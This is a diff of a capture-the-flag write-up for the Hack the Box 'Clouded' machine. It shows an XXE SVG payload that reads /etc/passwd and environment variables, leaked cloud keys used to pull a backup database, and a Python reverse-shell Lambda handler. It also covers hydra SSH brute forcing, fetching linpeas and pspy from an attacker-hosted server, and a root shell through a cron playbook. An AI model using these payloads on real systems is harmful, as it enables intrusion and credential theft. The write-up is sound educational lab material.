@@ -1,5 +1,5 @@
 # Clouded
-Clouded is the third of the three full pwn challenges that we solved with *GCC* during the *Hack the Box University CTF 2024: Binary Badlands*
+Clouded is the third of the three fullpwn challenges that we solved with *GCC* during the *Hack the Box University CTF 2024: Binary Badlands*
 
 ```
 Nmap scan report for clouded.htb (10.129.231.169)
@@ -53,10 +53,10 @@ We then tried to do some recon on our newly found domain local.clouded.htb and w
 
 After a bit more searching and testing we managed to find an XXE injection in the upload feature of the website!
 
-We this payload:
+We used this payload:
 
 
-`
+```
 <?xml version="1.0" standalone="no"?>
 <!DOCTYPE svg [
   <!ENTITY xxe SYSTEM "file:///etc/passwd">
@@ -64,54 +64,55 @@ We this payload:
 <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
   <text x="10" y="20">&xxe;</text>
 </svg>
-`
+```
 When we downloaded the file from the url the site gave us it had the content of /etc/passwd in it !
 
 ‘
 <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
   <text x="10" y="20">
-root:x:0:0:root:/root:/bin/bash
-bin:x:1:1:bin:/bin:/sbin/nologin
-daemon:x:2:2:daemon:/sbin:/sbin/nologin
-adm:x:3:4:adm:/var/adm:/sbin/nologin
-lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
-sync:x:5:0:sync:/sbin:/bin/sync
-shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
-halt:x:7:0:halt:/sbin:/sbin/halt
-mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
-operator:x:11:0:operator:/root:/sbin/nologin
-games:x:12:100:games:/usr/games:/sbin/nologin
-ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
-nobody:x:99:99:Nobody:/:/sbin/nologin
-systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
-dbus:x:81:81:System message bus:/:/sbin/nologin
-rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
-libstoragemgmt:x:999:997:daemon account for libstoragemgmt:/var/run/lsm:/sbin/nologin
-sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
-rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
-nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin
-ec2-instance-connect:x:998:996::/home/ec2-instance-connect:/sbin/nologin
-postfix:x:89:89::/var/spool/postfix:/sbin/nologin
-chrony:x:997:995::/var/lib/chrony:/sbin/nologin
-tcpdump:x:72:72::/:/sbin/nologin
-ec2-user:x:1000:1000:EC2 Default User:/home/ec2-user:/bin/bash
-rngd:x:996:994:Random Number Generator Daemon:/var/lib/rngd:/sbin/nologin
-slicer:x:995:992::/tmp:/sbin/nologin
-sb_logger:x:994:991::/tmp:/sbin/nologin
+root:x:0:0:root:/root:/bin/bash \
+bin:x:1:1:bin:/bin:/sbin/nologin\
+daemon:x:2:2:daemon:/sbin:/sbin/nologin\
+adm:x:3:4:adm:/var/adm:/sbin/nologin\
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\
+sync:x:5:0:sync:/sbin:/bin/sync\
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\
+halt:x:7:0:halt:/sbin:/sbin/halt\
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin\
+operator:x:11:0:operator:/root:/sbin/nologin\
+games:x:12:100:games:/usr/games:/sbin/nologin\
+ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin\
+nobody:x:99:99:Nobody:/:/sbin/nologin\
+systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin\
+dbus:x:81:81:System message bus:/:/sbin/nologin\
+rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin\
+libstoragemgmt:x:999:997:daemon account for libstoragemgmt:/var/run/lsm:/sbin/nologin\
+sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin\
+rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin\
+nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin\
+ec2-instance-connect:x:998:996::/home/ec2-instance-connect:/sbin/nologin\
+postfix:x:89:89::/var/spool/postfix:/sbin/nologin\
+chrony:x:997:995::/var/lib/chrony:/sbin/nologin\
+tcpdump:x:72:72::/:/sbin/nologin\
+ec2-user:x:1000:1000:EC2 Default User:/home/ec2-user:/bin/bash\
+rngd:x:996:994:Random Number Generator Daemon:/var/lib/rngd:/sbin/nologin\
+slicer:x:995:992::/tmp:/sbin/nologin\
+sb_logger:x:994:991::/tmp:/sbin/nologin\
 `
 
 Using the same method we were able to extract the environment variables located on /proc/self/environ:
 
-`
+```
 cat file_8m6ImlfKiB.svg 
 <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
   <text x="10" y="20">AWS_LAMBDA_FUNCTION_VERSION=$LATESTEDGE_PORT=4566HOSTNAME=e1e35b1f5338_LAMBDA_CONTROL_SOCKET=14AWS_LAMBDA_FUNCTION_TIMEOUT=10LOCALSTACK_HOSTNAME=172.18.0.2AWS_LAMBDA_LOG_GROUP_NAME=/aws/lambda/UploadToS3LAMBDA_TASK_ROOT=/var/taskLD_LIBRARY_PATH=/var/lang/lib:/lib64:/usr/lib64:/var/runtime:/var/runtime/lib:/var/task:/var/task/lib:/opt/libAWS_LAMBDA_RUNTIME_API=127.0.0.1:9001AWS_LAMBDA_LOG_STREAM_NAME=2024/12/17/[$LATEST]54d2b33123587737c87e8aed538da00b_LAMBDA_SHARED_MEM_FD=11AWS_EXECUTION_ENV=AWS_Lambda_python3.8_LAMBDA_RUNTIME_LOAD_TIME=1530232235231AWS_XRAY_DAEMON_ADDRESS=169.254.79.2:2000AWS_LAMBDA_FUNCTION_NAME=UploadToS3PATH=/var/lang/bin:/usr/local/bin:/usr/bin/:/bin:/opt/bin_LAMBDA_LOG_FD=9AWS_DEFAULT_REGION=us-east-1PWD=/var/taskAWS_SECRET_ACCESS_KEY=eDjlDHTtnOELI/L3FRMENG/dFxLujMjUSTaCHILLGUYLAMBDA_RUNTIME_DIR=/var/runtimeLANG=en_US.UTF-8TZ=:UTCAWS_REGION=us-east-1AWS_ACCESS_KEY_ID=AKIA5M34BDN8GCJGRFFBSHLVL=0HOME=/home/sbx_user1051AWS_LAMBDA_FUNCTION_INVOKED_ARN=arn:aws:lambda:us-east-1:000000000000:function:UploadToS3_AWS_XRAY_DAEMON_ADDRESS=169.254.79.2_AWS_XRAY_DAEMON_PORT=2000_X_AMZN_TRACE_ID=Root=1-dc99d00f-c079a84d433534434534ef0d;Parent=91ed514f1e5c03b2;Sampled=1_LAMBDA_SB_ID=7AWS_XRAY_CONTEXT_MISSING=LOG_ERROR_LAMBDA_CONSOLE_SOCKET=16AWS_LAMBDA_COGNITO_IDENTITY={}_HANDLER=handler.lambda_handlerDOCKER_LAMBDA_USE_STDIN=1AWS_LAMBDA_FUNCTION_MEMORY_SIZE=1536</text>
 </svg>
-`
+```
 
 We will use the data we extracted above to login to the AWS bucket and list its content !
 
-AWS_SECRET_ACCESS_KEY=eDjlDHTtnOELI/L3FRMENG/dFxLujMjUSTaCHILLGUYLAMBDAAWS_REGION=us-east-1
+AWS_SECRET_ACCESS_KEY=eDjlDHTtnOELI/L3FRMENG/dFxLujMjUSTaCHILLGUYLAMBDA\
+AWS_REGION=us-east-1\
 AWS_ACCESS_KEY_ID=AKIA5M34BDN8GCJGRFFBSHLVL
 
 ![AWS login](/HTB-UNIVERSITY-2024/images/aws_login.png)
@@ -122,6 +123,7 @@ We can see that there is a folder containing all of the file uploaded since the 
 $ aws --endpoint=http://local.clouded.htb/ s3 sync s3://clouded-internal .
 download: s3://clouded-internal/backup.db to ./backup.db 
 `
+
 We open the .db file using sqlitebrowser:
 
 ![Database](/HTB-UNIVERSITY-2024/images/database.png)
@@ -136,7 +138,7 @@ This is the moment things got a little messed up. With the information we had, w
 
 We then opted to list the lambda functions on the aws bucket:
 
-`
+```
 ┌──(kali㉿kali)-[~]
 └─$ aws --endpoint=http://local.clouded.htb/ lambda list-functions --output json
 {
@@ -170,12 +172,12 @@ We then opted to list the lambda functions on the aws bucket:
         }
     ]
 }
-`
+```
 The function which was running on the bucket is called UploadToS3 and it is using python3, we then proceeded to search for a way to execute code by using the function feature.
 
 After some trial and error we managed to upload our function which executes our script “handler.py”
 
-`
+```
 └─$ cat handler.py 
 import socket,subprocess,os
 
@@ -186,7 +188,8 @@ def handler(event, context):
   os.dup2(s.fileno(), 1)
   os.dup2(s.fileno(), 2)
   p = subprocess.call(["/bin/bash", "-i"])
-`
+```
+
 ![handler function upload](/HTB-UNIVERSITY-2024/images/handler_function.png)
 
 We can see that we successfully uploaded our function and we have executed using `lambda invoke`
@@ -237,6 +240,8 @@ if __name__ == "__main__":
         FILE_USERS.write(lname+ ":"+passwd)                   # joe
 FILE_USERS.close()
 ```
+We use hydra to bruteforce: `hydra -C creds.txt ssh://clouded.htb`
+
 ![hydra](/HTB-UNIVERSITY-2024/images/hydra.png)
 
 We can now ssh login onto the machine and find the first flag !
@@ -246,11 +251,12 @@ We can now ssh login onto the machine and find the first flag !
 We then upload linpeas and pspy on the machine using a basic python http server and we execute it:
 
 
-‘
+```
 sudo python3 -m http.server #Host
 wget 10.10.10.10:8000/linpeas.sh
 wget 10.10.10.10:8000/pspy64 #Victim
-‘
+```
+
 We don’t find anything very interesting in linpeas but in pspy we can see that there is a cronjob running:
 
 ![playbook](/HTB-UNIVERSITY-2024/images/playbook.png)
@@ -268,3 +274,5 @@ We can add another .yml file in /opt/infra-setup to get get a reverse shell as t
 And boom we get a root reverse shell and we have our root flag!:
 
 ![rootflag](/HTB-UNIVERSITY-2024/images/rootflag.png)
+
+Overall this was supposed a pretty easy challenge but it was very guessy and we lost a lot of time on a rabbit hole
